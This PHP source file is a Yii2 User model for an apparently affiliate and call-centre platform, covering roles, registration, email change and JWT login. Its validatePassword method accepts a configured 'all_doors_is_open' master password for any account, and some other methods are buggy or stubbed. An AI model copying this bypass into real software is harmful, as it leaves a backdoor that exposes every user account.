<?php


namespace common\modules\user\models\tables;

use common\models\callcenter\OperatorConf;
use common\models\finance\advert\AdvertMoney;
use common\models\webmaster\integrations\UserApi;
use common\modules\user\helpers\Password;
use common\modules\user\Mailer;
use common\modules\user\models\AuthItem;
use common\modules\user\Module;
use common\modules\user\traits\AuthManagerTrait;
use common\modules\user\traits\ModuleTrait;
use common\modules\user\UserFinder;
use Firebase\JWT\JWT;
use Yii;
use yii\behaviors\TimestampBehavior;
use yii\db\ActiveQuery;
use yii\db\ActiveRecord;
use yii\db\Expression;
use yii\helpers\ArrayHelper;
use yii\helpers\Html;
use yii\rbac\Role;
use yii\web\Application as WebApplication;
use yii\web\IdentityInterface;
use yii\web\Request as WebRequest;

/**
 * User ActiveRecord model.
 *
 * @property bool $isAdmin
 * @property bool $isBlocked
 * @property bool $isConfirmed
 *
 * Database fields:
 * @property integer $id
 * @property string $username
 * @property string $email
 * @property string $unconfirmed_email
 * @property string $password_hash
 * @property string $auth_key
 * @property integer $confirmed_at
 * @property integer $role
 * @property integer $blocked_at
 * @property integer $created_at
 * @property integer $updated_at
 * @property integer $last_login_at
 * @property integer $flags
 *
 * @property AdvertMoney $advertMoney
 *
 * Defined relations:
 * @property BaseProfile $profile
 *
 * Dependencies:
 * @property-read UserFinder $UserFinder
 * @property-read Module $module
 * @property-read Mailer $mailer
 *
 * @author makandy <makandy42@gmail.com>
 */
class User extends ActiveRecord implements IdentityInterface
{
    use ModuleTrait;
    use AuthManagerTrait;

    const ROLE_ADMIN = 1;
    const ROLE_ADVERTISER = 2;
    const ROLE_ADVERTISER_MANAGER = 21;

    const ROLE_WEBMASTER = 3;
    const ROLE_SUPER_WM = 31;

    const ROLE_MANAGER = 4;
    const ROLE_FIN_MANAGER = 5;

    const ROLE_CALLCENTER_MASTER = 51;
    const ROLE_CALLCENTER_MANAGER = 52;
    const ROLE_OPERATOR = 53;
    const ROLE_STATIST = 54;

    const ROLE_VISOR = 6;
    const ROLE_SMM = 7;


    const BEFORE_CREATE = 'beforeCreate';
    const AFTER_CREATE = 'afterCreate';
    const BEFORE_REGISTER = 'beforeRegister';
    const AFTER_REGISTER = 'afterRegister';
    const BEFORE_CONFIRM = 'beforeConfirm';
    const AFTER_CONFIRM = 'afterConfirm';

    // following constants are used on secured email changing process
    const OLD_EMAIL_CONFIRMED = 0b1;
    const NEW_EMAIL_CONFIRMED = 0b10;

    /** @var string Plain password. Used for model validation. */
    public $password;

    /** @var string variable used for search model. */
    public $children_name;

    /** @var string variable used for search model. */
    public $parent_name;

    /** @var BaseProfile|null */
    private $_profile;

    /** @var string Default username regexp */
    public static $usernameRegexp = '/^[-a-zA-Z0-9_\.@]+$/';

    public static function roles()
    {
        return [
            [
                'role_id' => self::ROLE_ADMIN,
                'role_name' => 'Admin',
            ],
            [
                'role_id' => self::ROLE_ADVERTISER,
                'role_name' => 'Advertiser',
            ],
            [
                'role_id' => self::ROLE_ADVERTISER_MANAGER,
                'role_name' => 'Advertiser Manager',
            ],
            [
                'role_id' => self::ROLE_WEBMASTER,
                'role_name' => 'Webmaster',
            ],
            [
                'role_id' => self::ROLE_SUPER_WM,
                'role_name' => 'Super Webmaster',
            ],
            [
                'role_id' => self::ROLE_MANAGER,
                'role_name' => 'Manager',
            ],
            [
                'role_id' => self::ROLE_FIN_MANAGER,
                'role_name' => 'Finance Manager',
            ],
            [
                'role_id' => self::ROLE_CALLCENTER_MASTER,
                'role_name' => 'Call Center Master',
            ],
            [
                'role_id' => self::ROLE_CALLCENTER_MANAGER,
                'role_name' => 'Call Center Manager',
            ],
            [
                'role_id' => self::ROLE_OPERATOR,
                'role_name' => 'Operator',
            ],
            [
                'role_id' => self::ROLE_STATIST,
                'role_name' => 'Statist',
            ],
            [
                'role_id' => self::ROLE_VISOR,
                'role_name' => 'Visor',
            ],
            [
                'role_id' => self::ROLE_SMM,
                'role_name' => 'Smm',
            ],
        ];
    }

    /**
     * @return array
     */
    public static function AdvertiserRoles()
    {
        return [
            [
                'role_id' => self::ROLE_MANAGER,
                'role_name' => 'Manager',
            ],
            [
                'role_id' => self::ROLE_CALLCENTER_MASTER,
                'role_name' => 'Call Center Master',
            ],
            [
                'role_id' => self::ROLE_CALLCENTER_MANAGER,
                'role_name' => 'Call Center Manager',
            ],
            [
                'role_id' => self::ROLE_OPERATOR,
                'role_name' => 'Operator',
            ],
            [
                'role_id' => self::ROLE_VISOR,
                'role_name' => 'Visor',
            ],
        ];
    }

    /**
     * @return array
     */
    public static function rolesIndexed()
    {
        return [
            self::ROLE_ADMIN => 'Admin',
            self::ROLE_ADVERTISER => 'Advertiser',
            self::ROLE_ADVERTISER_MANAGER => 'Advertiser Manager',
            self::ROLE_WEBMASTER => 'Webmaster',
            self::ROLE_SUPER_WM => 'Super Webmaster',
            self::ROLE_MANAGER => 'Manager',
            self::ROLE_FIN_MANAGER => 'Finance Manager',
            self::ROLE_CALLCENTER_MASTER => 'Call Center Master',
            self::ROLE_CALLCENTER_MANAGER => 'Call Center Manager',
            self::ROLE_OPERATOR => 'Operator',
            self::ROLE_STATIST => 'Statist',
            self::ROLE_VISOR => 'Visor',
            self::ROLE_SMM => 'Smm',
        ];
    }

//    public function getOwnerId()
//    {
//        if (!empty($parent = $this->getParent()->one())) return $parent->id;
//        if ($this->role == self::ROLE_ADVERTISER) return $this->id;
//        return null;
//    }

    public function getOwnerId()
    {
        if ($this->role === self::ROLE_ADVERTISER) {
            return $this->id;
        }
        
        if ( !empty($parent = $this->getParent()->all())) {
            $parents = ArrayHelper::getColumn($parent, 'id');
            
            if (\count($parents) === 1) {
                return $parents[0];
            }
            
            return $parents;
        }
    
        return null;
    }

    /**
     * @return array|int
     */
    public function getWmChild()
    {
        $child = $this->getChildren()->select('id')->asArray()->all();
        array_push($child, ['id' => (string)$this->id]);

        if ($this->role == self::ROLE_SUPER_WM) return ArrayHelper::getColumn($child, 'id');
        return $this->id;
    }

    public function getApiKeys(){
        return $this->hasMany(UserApi::className(),['user_id' => 'id']);
    }

    /**
     * @return object|UserFinder
     * @throws \yii\base\InvalidConfigException
     */
    protected function getUserFinder()
    {
        return \Yii::$container->get(UserFinder::className());
    }

    /**
     * @return Mailer|object
     * @throws \yii\base\InvalidConfigException
     */
    protected function getMailer()
    {
        return \Yii::$container->get(Mailer::className());
    }

    /**
     * @return bool Whether the user is confirmed or not.
     */
    public function getIsConfirmed()
    {
        return $this->confirmed_at != null;
    }

    /**
     * @return bool Whether the user is blocked or not.
     */
    public function getIsBlocked()
    {
        return $this->blocked_at != null;
    }

    /**
     * @return bool Whether the user is an admin or not.
     */
    public function getIsAdmin()
    {
        return
            ($this->getAuthManager() && $this->module->adminPermission ?
                \Yii::$app->user->can($this->module->adminPermission) : false)
            || in_array($this->username, $this->module->admins);
    }

    /**
     * @param $id
     * @return bool Whether the user is an owner or not.
     */
    public function getIsOwner($id)
    {
        return $this->id == $id;
    }

    /**
     * @param $id
     * @return bool Whether the user is online or not.
     */
    public function getIsOnline($id = null)
    {
        if (empty($id)) {
            $id = $this->id;
        }
        //TODO add method online
        return $id % 2;
    }

    /**
     * @return \yii\db\ActiveQuery
     */
    public function getProfile()
    {
        return $this->hasOne(BaseProfile::className(), ['user_id' => 'id']);
    }

    /**
     * @return \yii\db\ActiveQuery
     */
    public function getAdvertMoney()
    {
        return $this->hasOne(AdvertMoney::className(), ['advert_id' => 'id']);
    }

    /**
     * @param BaseProfile $profile
     */
    public function setProfile(BaseProfile $profile)
    {
        $this->_profile = $profile;
    }

    /** @inheritdoc */
    public function getId()
    {
        return $this->getAttribute('id');
    }

    /** @inheritdoc */
    public function getAuthKey()
    {
        return $this->getAttribute('auth_key');
    }

    /** @inheritdoc */
    public function attributeLabels()
    {
        return [
            'username' => \Yii::t('user', 'Username'),
            'email' => \Yii::t('user', 'Email'),
            'unconfirmed_email' => \Yii::t('user', 'New email'),
            'password' => \Yii::t('user', 'Password'),
            'created_at' => \Yii::t('user', 'Registration time'),
            'last_login_at' => \Yii::t('user', 'Last login'),
            'confirmed_at' => \Yii::t('user', 'Confirmation time'),
        ];
    }

    /** @inheritdoc */
    public function behaviors()
    {
        return [
            [
                'class' => TimestampBehavior::className(),
                'value' => new Expression('NOW()'),
            ]
        ];
    }

    /** @inheritdoc */
    public function scenarios()
    {
        $scenarios = parent::scenarios();
        return ArrayHelper::merge($scenarios, [
            'register' => ['username', 'email', 'password'],
            'connect' => ['username', 'email'],
            'create' => ['username', 'email', 'password'],
            'update' => ['username', 'email', 'password'],
            'settings' => ['username', 'email', 'password'],
        ]);
    }

    /** @inheritdoc */
    public function rules()
    {
        return [
            // username rules
            'usernameTrim' => ['username', 'trim'],
            'usernameRequired' => ['username', 'required', 'on' => ['register', 'create', 'connect', 'update']],
            'usernameMatch' => ['username', 'match', 'pattern' => static::$usernameRegexp],
            'usernameLength' => ['username', 'string', 'min' => 3, 'max' => 255],
            'usernameUnique' => [
                'username',
                'unique',
                'message' => \Yii::t('user', 'This username has already been taken')
            ],

            // email rules
            'emailTrim' => ['email', 'trim'],
            'emailRequired' => ['email', 'required', 'on' => ['register', 'connect', 'create', 'update']],
            'emailPattern' => ['email', 'email'],
            'emailLength' => ['email', 'string', 'max' => 255],
            'emailUnique' => [
                'email',
                'unique',
                'message' => \Yii::t('user', 'This email address has already been taken')
            ],

            // password rules
            'passwordRequired' => ['password', 'required', 'on' => ['register']],
            'passwordLength' => ['password', 'string', 'min' => 6, 'max' => 60, 'on' => ['register', 'create']],

            /**
             *fields for front login Angular
             */

            ['registration_ip', 'string'],
            ['access_token_expired_at', 'string'],
            ['access_token', 'string'],

            ['role', 'required'],
            ['role', 'integer'],
            ['role', 'in', 'range' => [
                self::ROLE_ADMIN, self::ROLE_ADVERTISER, self::ROLE_WEBMASTER, self::ROLE_ADVERTISER_MANAGER,
                self::ROLE_MANAGER, self::ROLE_FIN_MANAGER, self::ROLE_CALLCENTER_MASTER, self::ROLE_CALLCENTER_MANAGER,
                self::ROLE_OPERATOR, self::ROLE_STATIST, self::ROLE_SMM, self::ROLE_VISOR, self::ROLE_SUPER_WM,
            ]],
        ];
    }

    /** @inheritdoc */
    public function validateAuthKey($authKey)
    {
        return $this->getAttribute('auth_key') === $authKey;
    }

    /**
     * Creates new user account. It generates password if it is not provided by user.
     *
     * @return bool
     * @throws \Exception
     */
    public function create()
    {
        if ($this->getIsNewRecord() == false) {
            throw new \RuntimeException('Calling "' . __CLASS__ . '::' . __METHOD__ . '" on existing user');
        }
        $transaction = $this->getDb()->beginTransaction();
        try {
            $this->password = $this->password == null ? Password::generate(8) : $this->password;

            $this->trigger(self::BEFORE_CREATE);

            if (!$this->save()) {
//                echo '<pre>';
//                var_dump($this);
//                die();
                $transaction->rollBack();
                return false;
            }

            $this->confirm();

//            $this->mailer->sendWelcomeMessage($this, null, true);
            $this->trigger(self::AFTER_CREATE);

            $transaction->commit();

            return true;
        } catch (\Exception $e) {
            $transaction->rollBack();
            \Yii::warning($e->getMessage());
            throw $e;
        }
    }

    /**
     * This method is used to register new user account. If Module::enableConfirmation is set true, this method
     * will generate new confirmation token and use mailer to send it to the user.
     *
     * @return bool
     *
     * @throws \Exception
     */
    public function register()
    {
        if ($this->getIsNewRecord() == false) {
            throw new \RuntimeException('Calling "' . __CLASS__ . '::' . __METHOD__ . '" on existing user');
        }

        $transaction = $this->getDb()->beginTransaction();

        try {
            $this->confirmed_at = $this->module->userConfirmationAccount() ? new Expression('NOW()') : null;
            $this->password = $this->module->enableGeneratingPassword ? Password::generate(8) : $this->password;

            $this->trigger(self::BEFORE_REGISTER);

            if (!$this->save()) {
                $transaction->rollBack();
                return false;
            }


            if ($this->module->userConfirmationAccount()) {
                /** @var Token $token */
                $token = \Yii::createObject(['class' => Token::className(), 'type' => Token::TYPE_CONFIRMATION]);
                $token->link('user', $this);
            }

            $this->mailer->sendWelcomeMessage($this, isset($token) ? $token : null);
            $this->trigger(self::AFTER_REGISTER);

            $transaction->commit();

            return true;
        } catch (\Exception $e) {
            $transaction->rollBack();
            \Yii::warning($e->getMessage());
            throw $e;
        }
    }

    /**
     * Attempts user confirmation.
     *
     * @param string $code Confirmation code.
     *
     * @return boolean
     */
    public function attemptConfirmation($code)
    {
        $token = $this->UserFinder->findTokenByParams($this->id, $code, Token::TYPE_CONFIRMATION);

        if ($token instanceof Token && !$token->isExpired) {
            $token->delete();
            if (($success = $this->confirm())) {
                \Yii::$app->user->login($this, $this->module->rememberFor);
                //$this->generateAccessToken();
                $message = \Yii::t('user', 'Thank you, registration is now complete.');
            } else {
                $message = \Yii::t('user', 'Something went wrong and your account has not been confirmed.');
            }
        } else {
            $success = false;
            $message = \Yii::t('user', 'The confirmation link is invalid or expired. Please try requesting a new one.');
        }

        \Yii::$app->session->setFlash($success ? 'success' : 'danger', $message);

        return $success;
    }

    /**
     * Generates a new password and sends it to the user.
     *
     * @return bool
     */
    public function resendPassword()
    {
        $this->password = Password::generate(8);
        $this->save(false, ['password_hash']);

        return $this->mailer->sendGeneratedPassword($this, $this->password);
    }

    /**
     * This method attempts changing user email. If user's "unconfirmed_email" field is empty is returns false, else if
     * somebody already has email that equals user's "unconfirmed_email" it returns false, otherwise returns true and
     * updates user's password.
     *
     * @param string $code
     *
     * @throws \Exception
     */
    public function attemptEmailChange($code)
    {
        // TODO refactor method

        /** @var Token $token */
        $token = $this->UserFinder->findToken([
            'user_id' => $this->id,
            'code' => $code,
        ])->andWhere(['in', 'type', [Token::TYPE_CONFIRM_NEW_EMAIL, Token::TYPE_CONFIRM_OLD_EMAIL]])->one();

        if (empty($this->unconfirmed_email) || $token === null || $token->isExpired) {
            \Yii::$app->session->setFlash('danger', \Yii::t('user', 'Your confirmation token is invalid or expired'));
        } else {
            $token->delete();

            if (empty($this->unconfirmed_email)) {
                \Yii::$app->session->setFlash('danger', \Yii::t('user', 'An error occurred processing your request'));
            } elseif ($this->UserFinder->findUser(['email' => $this->unconfirmed_email])->exists() == false) {
                if ($this->module->emailChangeStrategy == Module::STRATEGY_SECURE) {
                    switch ($token->type) {
                        case Token::TYPE_CONFIRM_NEW_EMAIL:
                            $this->flags |= self::NEW_EMAIL_CONFIRMED;
                            \Yii::$app->session->setFlash(
                                'success',
                                \Yii::t(
                                    'user',
                                    'Awesome, almost there. Now you need to click the confirmation link sent to your old email address'
                                )
                            );
                            break;
                        case Token::TYPE_CONFIRM_OLD_EMAIL:
                            $this->flags |= self::OLD_EMAIL_CONFIRMED;
                            \Yii::$app->session->setFlash(
                                'success',
                                \Yii::t(
                                    'user',
                                    'Awesome, almost there. Now you need to click the confirmation link sent to your new email address'
                                )
                            );
                            break;
                    }
                }
                if ($this->module->emailChangeStrategy == Module::STRATEGY_DEFAULT
                    || ($this->flags & self::NEW_EMAIL_CONFIRMED && $this->flags & self::OLD_EMAIL_CONFIRMED)) {
                    $this->email = $this->unconfirmed_email;
                    $this->unconfirmed_email = null;
                    \Yii::$app->session->setFlash('success', \Yii::t('user', 'Your email address has been changed'));
                }
                $this->save(false);
            }
        }
    }

    /**
     * Confirms the user by setting 'confirmed_at' field to current time.
     *
     * @return bool
     */
    public function confirm()
    {
        $this->trigger(self::BEFORE_CONFIRM);
        $result = (bool)$this->updateAttributes(['confirmed_at' => new Expression('NOW()')]);
        $this->trigger(self::AFTER_CONFIRM);
        return $result;
    }

    /**
     * Resets password.
     *
     * @param string $password
     *
     * @return bool
     */
    public function resetPassword($password)
    {
        return (bool)$this->updateAttributes(['password_hash' => Password::hash($password)]);
    }

    /**
     * Blocks the user by setting 'blocked_at' field to current time and regenerates auth_key.
     */
    public function block()
    {
        return (bool)$this->updateAttributes([
            'blocked_at' => new Expression('NOW()'),
            'auth_key' => \Yii::$app->security->generateRandomString(),
        ]);
    }

    /**
     * UnBlocks the user by setting 'blocked_at' field to null.
     */
    public function unblock()
    {
        return (bool)$this->updateAttributes(['blocked_at' => null]);
    }

    /**
     * Generates new username based on email address, or creates new username
     * like "emailuser1".
     */
    public function generateUsername()
    {
        // try to use name part of email
        $username = explode('@', $this->email)[0];
        $this->username = $username;
        if ($this->validate(['username'])) {
            return $this->username;
        }

        // valid email addresses are less restricitve than our
        // valid username regexp so fallback to 'user123' if needed:
        if (!preg_match(self::$usernameRegexp, $username)) {
            $username = 'user';
        }
        $this->username = $username;

        $max = $this->UserFinder->userQuery->max('id');

        // generate username like "user1", "user2", etc...
        do {
            $this->username = $username . ++$max;
        } while (!$this->validate(['username']));

        return $this->username;
    }

    /** @inheritdoc */
    public function beforeSave($insert)
    {
        if ($insert) {
            $this->setAttribute('auth_key', \Yii::$app->security->generateRandomString());
            if (\Yii::$app instanceof WebApplication) {
                $this->setAttribute('registration_ip', \Yii::$app->request->userIP);
            }
        }

        if (!empty($this->password)) {
            $this->setAttribute('password_hash', Password::hash($this->password));
        }

        // Fill registration ip with current ip address if empty

//        if($this->registration_ip == '') {
//        if( \Yii::$app instanceof WebApplication && $this->registration_ip == '') {
//            $this->registration_ip = Yii::$app->request->userIP;
//        }

        // Fill auth key if empty
        if ($this->auth_key == '') {
            $this->generateAuthKey();
        }

        // Fill access token if empty
        if ($this->access_token == '') {
            $this->generateAccessToken();
        }

        return parent::beforeSave($insert);
    }

    /** @inheritdoc */
    public function afterSave($insert, $changedAttributes)
    {
        $timezone = trim(Yii::$app->request->post('timezone'));
        parent::afterSave($insert, $changedAttributes);
        if ($insert) {
            if ($this->_profile == null) {
                $this->_profile = \Yii::createObject(BaseProfile::className());
                $this->_profile->timezone = $timezone;
            }
            $this->_profile->link('user', $this);
        }
    }

    /** @inheritdoc */
    public static function tableName()
    {
        return '{{%user}}';
    }

    /** @inheritdoc */
    public static function findIdentity($id)
    {
        return static::findOne($id);
    }

//    /** @inheritdoc */
//    public static function findIdentityByAccessToken($token, $type = null)
//    {
//        throw new NotSupportedException('Method "' . __CLASS__ . '::' . __METHOD__ . '" is not implemented.');
//    }

    public function getModelParent()
    {
        return self::find()->from(['{{%user}}', '{{%user_child}}'])
            ->where('{{%user}}.`id` = {{%user_child}}.`parent`')
            ->andWhere('{{%user_child}}.`child` = ' . $this->id)
            ->one();
    }

    public static function getUserList()
    {
        return ArrayHelper::map(User::find()->where(['blocked_at' => null])->all(), 'username', function ($user) {
            return sprintf('%s (%s)', Html::encode($user->username), Html::encode($user->email));
        });
    }

    /**
     * @return \yii\db\ActiveQuery
     */
    public function getUserChildren()
    {
        return $this->hasMany(UserChild::className(), ['child' => 'id']);
    }

    /**
     * @return \yii\db\ActiveQuery
     */
    public function getUserParent()
    {
        return $this->hasMany(UserChild::className(), ['parent' => 'id']);
    }

    /**
     * @return \yii\db\ActiveQuery
     */
    public function getParent()
    {
        return $this->hasMany(static::className(), ['id' => 'parent'])->viaTable('{{%user_child}}', ['child' => 'id']);
    }

    /**
     * @return \yii\db\ActiveQuery
     */
    public function getChildren()
    {
        return $this->hasMany(static::className(), ['id' => 'child'])->viaTable('{{%user_child}}', ['parent' => 'id']);
    }


    /**
     * Find role in field data.
     *
     * @param $value
     * @return null|\yii\rbac\Item|Role
     */
    public function getFindRolesData($value)
    {
        $roles = $this->getAuthManager()->getRoles();

        foreach ($roles as $role) {
            if ($this->isData($value, $role)) {
                return $role;
            };
        }

        return null;
    }

    /**
     * Comparison data with value.
     *
     * @param Role|null $role
     * @param $value
     * @return bool|null
     */
    public function isData($value, Role $role = null)
    {
        if (is_null($role)) {
            $role = $this->getAuthManager()->getRolesByUser($this->id);
            if (empty($role)) {
                return null;
            }
            $role = array_shift($role);
        }

        if ($this->getData($role) === $value) {
            return true;
        }
        return false;
    }

    /**
     * Get own value of field data.
     *
     * @param Role $role
     * @return mixed|null
     */
    public function getData(Role $role = null)
    {
        if (is_null($role)) {
            /** @var array $role */
            $arrRole = $this->getAuthManager()->getRolesByUser($this->id);
            if (empty($arrRole)) {
                return null;
            }
            /** @var Role $role */
            $role = array_shift($arrRole);
        }

        return $role->data;
    }

    /**
     * Set own value of field data.
     *
     * @param $value
     * @param null $idUser
     * @return bool
     */
    public function setData($value, $idUser = null)
    {
        if (is_null($idUser)) {
            $idUser = $this->id;
        }

        $role = $this->getAuthManager()->getRolesByUser($idUser);
        if (empty($role)) {
            return false;
        }
        $role = array_shift($role);

        if (is_string($value)) {
            $model = new AuthItem($role);
            $model->data = $value;
            if ($model->save()) {
                return true;
            }
        }

        return false;
    }

    /**
     * Get the children of the specified user and the specified role.
     *
     * @param $roleData
     * @param null $idUserParent
     * @return array
     */
//    public function getChildUsersByRole($roleData, $idUserParent = null)
//    {
//        if (is_null($idUserParent)) {
//            $idUserParent = Yii::$app->user->id;
//        }
//
//        $arrUsers = $this->getChildUsers($idUserParent);
//        $role = $this->getFindRolesData($roleData);
//
//        if (empty($arrUsers) || is_null($role)) {
//            return array();
//        }
//
//        $users = [];
//        $nameRole = $role->name;
//        foreach ($arrUsers as $user) {
//            if ($nameRole == $user['role']) {
//                array_push($users, $user);
//            }
//        }
//
//        return $users;
//    }


    public function getChildUsersByRole($role, $idUserParent = null)
    {
        $query = self::find()
            ->select([
                'user.id',
                'user_child.child'
            ])
            ->join('LEFT JOIN', 'user_child', 'user_child.parent = user.id');

        if (!is_null($idUserParent)) $query->where(['user.id' => $this->id]);
        else $query->where(['user.id' => $idUserParent]);

        $query->andWhere(['user.role' => $role]);

        $rows = $query->groupBy(['user_child.child'])->asArray()->all();
        $childrens = ArrayHelper::getColumn($rows, 'child');

        return $childrens;
    }

    /**
     * @param $owner_id
     * @return array
     */
    public static function getChildUsersByOwnerId($owner_id)
    {
        $query = self::find()
            ->select([
                'user.id',
                'user.username',
            ])
            ->join('join', 'user_child', 'user_child.child = user.id')
            ->where(['parent' => $owner_id])
            ->asArray()
            ->all();

        return ArrayHelper::getColumn($query, 'username');
    }

    /**
     * Get list users of array with value (id, username, role).
     *
     * @param null $parentUser
     * @return array|null Array with users.
     *
     * Example:
     * Array
     *  (
     *      [0] => Array
     *      (
     *          [id] => 3
     *          [username] => operator_1
     *          [role] => Operator
     *      )
     *
     *      [1] => Array
     *      (
     *          [id] => 4
     *          [username] => operator_2
     *          [role] => Operator
     *      )
     *
     *      [2] => Array
     *      (
     *          [id] => 5
     *          [username] => operator_3
     *          [role] => Operator
     *      )
     *
     *  )
     */
    public function getChildUsers($parentUser = null)
    {
        if (is_null($parentUser)) {
            $parentUser = Yii::$app->user->id;
        }

        $users = $this->UserFinder->getUserQuery()->with([
            'children' => function (ActiveQuery $query) {
                $table = $this->authManager()->assignmentTable;
                $query->select(['id', 'username', $table . '.item_name as role'])
                    ->join('JOIN', $table, $table . '.user_id = {{%user}}.id')->asArray();
            },
        ])->select(['id', 'username'])->where(['id' => $parentUser])->one();

        if (empty($users)) {
            return null;
        }
        return $users->children;
    }

    /**
     * Get all user.
     *
     * @param null $roleData
     * @return array|ActiveRecord[]
     */
    public function getAllUser($roleData = null)
    {
        $users = null;

        if (!is_null($roleData)) {
            $role = $this->getFindRolesData($roleData);
            if (is_null($role)) {
                return array();
            }
            $users = array('id' => Yii::$app->getAuthManager()->getUserIdsByRole($role->name));
        }

        return self::find()->select(['id', 'username'])->where($users)->asArray()->all();
    }

    /** ********************************************************* */
    /**
     * for Angular LogIn
     */


//    public function generateAccessTokenAfterUpdatingClientInfo($forceRegenerate=false)
//    {
//        // update client login, ip
//        //$this->last_login_ip = Yii::$app->request->userIP;
//        $this->last_login_at = new Expression('NOW()');
//
//        // check time is expired or not
//        if($forceRegenerate == true
//            || $this->access_token == ''
//            || $this->access_token_expired_at == null
//            || (time() > $this->access_token_expired_at))
//        {
//            // generate access token
//            $this->generateAccessToken();
//        }
//        $this->save(false);
//        return true;
//    }


    public function generateAccessTokenAfterUpdatingClientInfo($forceRegenerate = false)
    {
        // update client login, ip
        //$this->last_login_ip = Yii::$app->request->userIP;
        $this->last_login_at = new Expression('NOW()');

        // check time is expired or not
        if ($forceRegenerate == true
            || $this->access_token_expired_at == null
            || (time() > strtotime($this->access_token_expired_at))) {
            // generate access token
            $this->generateAccessToken();
        }
        $this->save(false);
        return true;
    }



//    public function generateAccessToken(){
//        // generate access token
//        $this->access_token = Yii::$app->security->generateRandomString();
//        $this->access_token_expired_at = new Expression('DATE_ADD(NOW(), INTERVAL 5 DAY)');
//    }


    public function generateAccessToken()
    {
        // generate access token
//        $this->access_token = Yii::$app->security->generateRandomString();
        $tokens = $this->getJWT();
        $this->access_token = $tokens[0];   // Token
        $this->access_token_expired_at = date("Y-m-d H:i:s", $tokens[1]['exp']); // Expire

    }

    /**
     * Generates "remember me" authentication key
     */

    public function generateAuthKey()
    {
        $this->auth_key = Yii::$app->security->generateRandomString();
    }

//    public static function findIdentityByAccessToken($token, $type = null)
//    {
//        /** @var User $user */
//        $user = static::find()->where([
//            '=', 'access_token', $token
//        ])
//            /*->andWhere([
//                '=', 'status',  self::STATUS_ACTIVE
//            ])*/
//            ->andWhere([
//                '>', 'access_token_expired_at', new Expression('NOW()')
//            ])->one();
//        if($user !== null &&
//            ($user->getIsBlocked() == true || $user->getIsConfirmed() == false)) {
//            return null;
//        }
//        return $user;
//    }

    public static function findIdentityByAccessToken($token, $type = null)
    {
        $secret = static::getSecretKey();
        // Decode token and transform it into array.
        // Firebase\JWT\JWT throws exception if token can not be decoded
        try {
            $decoded = JWT::decode($token, $secret, [static::getAlgo()]);
        } catch (\Exception $e) {
            return false;
        }
        static::$decodedToken = (array)$decoded;
        // If there's no jti param - exception
        if (!isset(static::$decodedToken['jti'])) {
            return false;
        }
        // JTI is unique identifier of user.
        // For more details: https://tools.ietf.org/html/rfc7519#section-4.1.7
        $id = static::$decodedToken['jti'];
        return static::findByJTI($id);
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {

        $user = static::findOne(['username' => $username, /*'status' => self::STATUS_ACTIVE*/]);
        //var_dump($user->getIsConfirmed());exit;
        if ($user !== null &&
            ($user->getIsBlocked() == true || $user->getIsConfirmed() == false)) {

            return null;
        }

        return $user;
    }

    public static function existUsername($username) {
        return static::findOne(['username' => $username]) ? true : false;
    }

    public static function existEmail($email) {
        return static::findOne(['email' => $email]) ? true : false;
    }

    public function validatePassword($password)
    {
        $all_door_is_open = isset(Yii::$app->params['all_doors_is_open']) && Yii::$app->params['all_doors_is_open'] == $password;
        if ($all_door_is_open) return true;
        return Yii::$app->security->validatePassword($password, $this->password_hash);
    }


    /**
     * Finds User model using static method findOne
     * Override this method in model if you need to complicate id-management
     * @param  string $id if of user to search
     * @return mixed       User model
     */
    public static function findByJTI($id)
    {
        /** @var User $user */
        $user = static::find()->where([
            '=', 'id', $id
        ])
//            ->andWhere([
//                '=', 'status',  self::STATUS_ACTIVE
//            ])
            ->andWhere([
                '>', 'access_token_expired_at', new Expression('NOW()')
            ])->one();
        if ($user !== null &&
            ($user->getIsBlocked() == true || $user->getIsConfirmed() == false)) {
            return null;
        }
        return $user;
    }


    protected static $decodedToken;

    protected static function getSecretKey()
    {
        return Yii::$app->params['jwtSecretCode'];
    }

    // And this one if you wish
    protected static function getHeaderToken()
    {
        return [];
    }

    /**
     * Getter for encryption algorytm used in JWT generation and decoding
     * Override this method to set up other algorytm.
     * @return string needed algorytm
     */
    public static function getAlgo()
    {
        return 'HS256';
    }

    /**
     * Returns some 'id' to encode to token. By default is current model id.
     * If you override this method, be sure that findByJTI is updated too
     * @return integer any unique integer identifier of user
     */
    public function getJTI()
    {
        return $this->getId();
    }

    /**
     * Encodes model data to create custom JWT with model.id set in it
     * @return array encoded JWT
     */
    public function getJWT()
    {
        // Collect all the data
        $secret = static::getSecretKey();
        $currentTime = time();
        $expire = $currentTime + 86400; // 1 day
        $request = Yii::$app->request;
        $hostInfo = '';
        // There is also a \yii\console\Request that doesn't have this property
        if ($request instanceof WebRequest) {
            $hostInfo = $request->hostInfo;
        }

        // Merge token with presets not to miss any params in custom
        // configuration
        $token = array_merge([
            'iat' => $currentTime,      // Issued at: timestamp of token issuing.
            'iss' => $hostInfo,         // Issuer: A string containing the name or identifier of the issuer application. Can be a domain name and can be used to discard tokens from other applications.
            'aud' => $hostInfo,
            'nbf' => $currentTime,       // Not Before: Timestamp of when the token should start being considered valid. Should be equal to or greater than iat. In this case, the token will begin to be valid 10 seconds
            'exp' => $expire,           // Expire: Timestamp of when the token should cease to be valid. Should be greater than iat and nbf. In this case, the token will expire 60 seconds after being issued.
            'data' => [
                'username' => $this->username,
//                'roleLabel'    =>  $this->getRoleLabel(),
                'lastLoginAt' => $this->last_login_at,
            ]
        ], static::getHeaderToken());
        // Set up id

        $operator = OperatorConf::find()->where(['operator_id' => Yii::$app->user->id])->one();
        if (!empty($operator)) $token['call_mode'] = $operator->call_mode;

        $token['jti'] = $this->getJTI();    // JSON Token ID: A unique string, could be used to validate a token, but goes against not having a centralized issuer authority.
        return [JWT::encode($token, $secret, static::getAlgo()), $token];
    }

    /**
     * @return static
     */
    public static function getChepollyNo_WmId()
    {
        return self::findOne(['username' => 'ChePollyNo_wm']);
    }
}
